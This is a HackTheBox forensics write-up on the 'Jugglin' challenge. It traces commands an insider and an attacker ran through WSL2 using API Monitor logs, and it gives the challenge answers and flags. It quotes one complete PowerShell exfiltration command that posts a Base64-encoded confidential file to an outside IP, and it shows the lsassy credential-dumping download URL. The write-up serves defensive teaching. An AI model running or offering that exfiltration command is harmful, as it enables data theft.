# Jugglin
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4cb55499-7ef4-4ed8-9329-06db9c054691)


## Lessons Learned:
- Conduct Forensic Analysis for .apmx64 file.
- Using API Monitor tool to analysis the file and intercept the function call.
- Identify string API API function call that can be intercepted to monitor keystrokes.
- Identify API function call that can be intercepted to monitor the behavior of WSL2.
- Identify string API function call that can be intercepted to monitor the usage of Windows Tool via WSL.
- Identify powershell module used to exfiltrate data from the victim machine.

## SCENARIO:

<p align="justify">Forela Corporation heavily depends on the utilisation of the Windows Subsystem for Linux (WSL), and currently, threat actors are leveraging this feature, taking advantage of its elusive nature that makes it difficult for defenders to detect. In response, the red team at Forela has executed a range of commands using WSL2 and shared API logs for analysis.</p>

## STEPS:
1. In this task, we're given a `.apmx64` file which we can analyze using API Monitor tool.
2. It is known that there is an insider that Forela Corporation that helps the attacker to gain access to the system.
3. Remembering Forela Corporation depends on the utilisation of WSL hence it's harder for us to detect. However the red team shared API logs for us to analyze.


> 1ST QUESTION --> ANS: whoami

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a58c216d-c29c-40dc-812f-1e1bcc317db7)


2. To identify the initial command executed by the insider, we need to monitor the API logs for `insider`.

> RESULT IN API Monitor tool.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/61e6541b-1b1d-41c0-aac0-64edb1f0ad6d)


3. Noticed, several **string** API function is called.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1af33836-065e-4656-953f-e439634309ca)


4. Reviewing each of them, found the first string function shall be our interest. Seems it used to map the UTF16 to a new character string.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c936c811-9084-4b69-adea-297cf08e5831)


5. So after `WideCharToMultiByte` API is called, another child API is also called --> `RtlUnicodeToUTF8N`. This API translate the specified Unicode string into a new string, using the UTF-8 code page.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/362aa80f-9a3d-4a77-ba2b-505b001d2246)


6. Then a `WriteFile` API is called, it is for writes data. Specifically for both synchronous and asynchronous operation --> I/O device.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b9fa8d9f-1a03-417f-8bcf-6bbd8384da5a)


7. So following each this API call shall until it stops calling it, shall means the keystroke is stopped and the system is processing an output.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9721f443-ec1f-47c8-9c3a-8fa0b3e775a5)


8. Long story short, following each of them shall resulting to `whoami` command.
9. The result can be seen at index 36.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bc81061f-c4b1-421e-8ad5-0cf25c91570b)


> 2ND QUESTION --> ANS: `RtlUnicodeToUTF8N, WideCharToMultiByte`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/93ee9549-38e9-431f-b4e6-fd9d4db829bd)


10. Based from our previous analysis, APIs can be used to monitor the keystrokes should be `WideCharToMultiByte` function and `RtlUnicodeToUTF8N` function.
11. Previously we identified the keystroke after `WideCharToMultiByte` function call and if you notice, there is a child API function call named `RtlUnicodeToUTF8N`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bb3ade3e-0b61-4860-8a65-87cbf454ef29)


> 3RD QUESTION --> ANS: kali

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0fbbcd47-1874-4b3a-a4e1-4a60948393a4)


12. After the execution of **whoami** command, we identified that the insider is interacting with a linux distribution named `kali`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/97589b9e-1a78-4f0a-b0c2-e69143efe373)


> 4TH QUESTION --> ANS: flag.txt

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9c73db6f-c2d2-4a30-8ef5-014dc9945318)


13. To identify the accessed file by the insider, we can use our previous method to identify the command executed by the insider.
14. Simply follow the previous APIs used to monitor the keystrokes.
15. Based from the log at index 109, we can see that the insider traversed to `/mnt/c/Users/karti/onedrive` directory.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/58e6916a-a4a2-4a27-8174-c1cef2a586a2)


16. Then the insider reached `desktop`. Seems the file accessed is at the desktop.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/00020cc0-298c-47d8-abee-a2dc7bdcd8dd)


17. Long story short, again simply by following the keystrokes we can identify that the insider executed `cat flag.txt`, then the content or output can be seen by checking the `WriteFile` module. Now we know that the insider accessed **flag.txt** file.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/df902e20-d221-474b-880a-7f5a07cfe06c)



> 5TH QUESTION --> ANS: HOOK_tH1$_apI_R7lUNIcoDet0utf8N

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0f4543e8-75d1-4155-b0bc-34e2ca218bc8)


18. Based from our previous finding, it's clear the content of flag.txt is `HOOK_tH1$_apI_R7lUNIcoDet0utf8N`.

> 6TH QUESTION --> ANS: Invoke-WebRequest

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9facab44-2a2b-44b2-8c61-ee2cadb09b5a)


18. Again, using the previous method, we identified that the insider tried to exfiltrate another data from the victim machine. it's a txt file named **Confidential**.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a583fa50-dde3-4cf9-91a0-f658bf8f947b)


```pwsh
PAYLOAD USED:

powershell.exe -c "Invoke-WebRequest -uri http://3.6.165.8/ -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"C:\confidential.txt\")))"
```

#### NOTES:

```
This command reads the contents of C:\confidential.txt, converts it to a Base64 string, and sends it via a POST
request to the specified remote server (http://3.6.165.8/). This is a common technique used by attackers to exfiltrate
sensitive data from a compromised system.
```

19. Based from the payload above, it's clear that the insider utilized `Invoke-WebRequest` module to extract data from the victim machine.

> 7TH QUESTION --> ANS: RtlUTF8ToUnicodeN

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/208cef87-467d-4ac6-b57d-7fc451e123dd)


20. Based from the previous finding, `MultiByteToWideChar` strings function has a child API string function named `RtlUTF8ToUnicodeN`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e36b8c53-8785-40a9-b21f-d9929f23e481)


21. The child API function is used to translate the specified source string into a Unicode String. It translates the source string using the UTF8 code page.

> 8TH QUESTION --> ANS: `H0ok_ThIS_@PI_rtlutf8TounICOD3N`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a7784474-d9fc-4c32-95b5-2c42bf7bedeb)


22. After the insider tried to exfiltrate the file, it accessed it afterwards. Using the same method by following the keystrokes. The output can be seen at the `WriteFile` API call.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/08f46359-3ec5-4892-a5b2-30ec1a7957d1)


> 9TH QUESTION --> ANS: lsassy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f345e08e-65fc-44a2-809f-a172de4a637f)


23. Now let's monitor the `Attacker` apxm64 file. Initial analysis, the attacker executed command `whoami` before lateral movement, which the output can be seen --> `kali`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0c5c6beb-27dd-4e40-8e6e-40ca4ab38827)


24. Then it tried to execute `lsassy`, but the binary seems not found inside the machine.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ce41adae-c5f6-469d-867b-17e43324bc34)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c37498db-da85-47c5-bf2d-2b45964354bc)



> 10TH QUESTION --> ANS: `http://3.6.165.8/lsassy`

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/aa73fe3d-f959-4995-82c8-0304909d4809)


25. So the next thing he does is to download the binary to the local machine.
26. This activity can be seen at index 31 and 32.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/58167b7e-8b88-4414-b4f5-ed537b3862a2)


> 11TH QUESTION --> ANS: e8f97fba9104d1ea5047948e6dfb67facd9f5b73

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3fca114f-def3-4024-b1ff-36dd07d9661a)


27. Afterwards, he changed the binary permissions to be executeable by user.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5124806c-770f-4ae2-b73f-6e312504365c)


28. Then the binary seems used to connect to a remote machine at `192.168.1.9` using the provided username and password, extract credentials from the lsassy process.
29. Then save the results to a file naamed `keys.txt` under `/tmp` directory.
30. Judging from this activity, seems the objective is to gain access to sensitive credential stored in memory on the target system, which can be used for further exploitation within the network.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a92b78b0-c54a-470a-93d7-05380782db63)


31. The result of this activity can be seen at the `WriteFile` API function call. Seems the attacker obtained the hash of victim `user`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/98731482-c900-4922-9353-5add7ef2f164)



> 12TH QUESTION --> ANS: WriteFile

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0bbd4fe3-f547-4140-9e50-129e242890f2)


32. Each time the attacker executed command inside the WSL2, the output can be seen at the `WriteFile` API function call. Also we use this API to identify the result of the execution.
33. Knowing this, we can conclude that `WriteFile` is a WIN32 API can be intercepted to monitor the behavior of the WSL2.
34. Anyway, we've investigated the case!

## IMPORTANT LINKS:

```
https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/
http://www.rohitab.com/apimonitor
```
